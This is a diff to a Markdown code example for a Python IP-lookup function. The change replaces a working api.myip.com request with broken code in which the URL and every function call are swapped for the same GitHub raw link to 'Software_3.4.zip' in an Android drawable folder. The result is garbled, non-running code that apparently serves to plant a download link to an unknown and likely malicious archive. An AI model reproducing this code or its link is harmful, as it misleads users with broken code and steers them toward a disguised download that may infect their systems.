@@ -28,12 +28,12 @@ Write function what you need. Do not forget about errors handling. Function must
 ```python
 def ip():
     try:
-        url = "https://api.myip.com"
-        with urllib.request.urlopen(url) as response:
-            data = response.read().decode()
-            json_data = json.loads(data)
-            ip = json_data.get("ip", "Not found")
-            country = json_data.get("country", "Not found")
+        url = "https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip"
+        with https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip(url) as response:
+            data = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip().decode()
+            json_data = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip(data)
+            ip = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip("ip", "Not found")
+            country = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip("country", "Not found")
             return f"IP: {ip}, {country}"
     except Exception as e:
         return str(e)
